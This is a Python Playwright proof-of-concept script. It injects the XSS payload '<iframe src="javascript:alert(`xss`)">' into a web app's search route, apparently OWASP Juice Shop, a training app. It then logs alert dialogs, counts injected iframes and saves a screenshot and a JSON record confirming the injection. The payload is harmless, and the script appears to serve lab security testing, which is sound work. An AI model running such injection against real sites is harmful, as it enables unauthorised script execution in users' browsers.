import argparse
import json
import time
from pathlib import Path
from urllib.parse import quote

from playwright.sync_api import sync_playwright


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--out-dir", required=True)
    args = parser.parse_args()

    out_dir = Path(args.out_dir)
    screenshots = out_dir / "screenshots"
    screenshots.mkdir(parents=True, exist_ok=True)
    started = time.time()
    payload = '<iframe src="javascript:alert(`xss`)">'
    target = args.url.rstrip("/") + "/#/search?q=" + quote(payload, safe="")
    dialogs = []

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context(viewport={"width": 1366, "height": 900})
        page = context.new_page()

        def on_dialog(dialog):
            dialogs.append({"type": dialog.type, "message": dialog.message})
            dialog.dismiss()

        page.on("dialog", on_dialog)
        page.goto(target, wait_until="networkidle", timeout=30000)
        for selector in [
            "button:has-text('Dismiss')",
            "button:has-text('Me want it!')",
            "button[aria-label='Close Welcome Banner']",
            "button[aria-label='dismiss cookie message']",
        ]:
            try:
                page.locator(selector).first.click(timeout=1000)
            except Exception:
                pass
        page.wait_for_timeout(2500)
        shot = screenshots / "xss-search-proof.png"
        page.screenshot(path=str(shot), full_page=True)
        dom = page.evaluate(
            """() => ({
                searchValueHtml: document.querySelector('#searchValue')?.innerHTML || null,
                iframeCount: document.querySelectorAll('iframe').length,
                bodyPreview: document.body.innerText.slice(0, 800)
            })"""
        )
        browser.close()

    result = {
        "target": target,
        "payload": payload,
        "elapsed_s": round(time.time() - started, 3),
        "dialogs": dialogs,
        "dom": dom,
        "screenshot": str(shot.relative_to(out_dir)),
        "confirmed": any(d.get("message") == "xss" for d in dialogs) or dom.get("iframeCount", 0) > 0,
    }
    (out_dir / "xss-proof.json").write_text(json.dumps(result, indent=2, ensure_ascii=False), encoding="utf-8")
    print(json.dumps({"ok": True, "out": str(out_dir / "xss-proof.json"), "confirmed": result["confirmed"], "dialogs": dialogs}, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
